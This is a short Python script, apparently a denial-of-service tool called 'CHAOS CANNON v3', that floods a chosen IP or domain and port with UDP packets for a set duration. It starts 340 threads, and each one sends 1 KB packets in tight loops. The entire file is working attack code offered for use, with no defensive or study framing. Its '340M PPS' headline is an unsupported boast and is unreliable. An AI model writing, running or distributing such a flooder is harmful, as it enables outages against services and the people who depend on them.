import argparse
import random
import socket
import threading
import time

def udp_flood(target, port, duration): 
    payload = b"\x00"*1024
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024)
    
    startTime = time.time()
    while time.time() - startTime < duration:
        for _ in range(1000):
            sock.sendto(payload, (target, port))
            
def main():
    parser = argparse.ArgumentParser(description="CHAOS CANNON v3 - 340M PPS EDITION")
    
    parser.add_argument("target", help="Target IP or domain")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port")    
    parser.add_argument("-d", "--duration", type=int, default=60, help="Attack duration in seconds")
    
    args = parser.parse_args()
    
    print(" 🌠 CHAOS CANNON v3 - 340M PPS EDITION 🌠")
    print(f"Target: {args.target}")
    print(f"Port: {args.port}")
    print(f"Duration: {args.duration}")
    print("attack starting in 3 seconds...")
    
    time.sleep(3)
    
    for _ in range(340):
        udp_thread = threading.Thread(target=udp_flood, args=(args.target, args.port, args.duration))
        udp_thread.start()

if __name__ == "__main__":
    main()
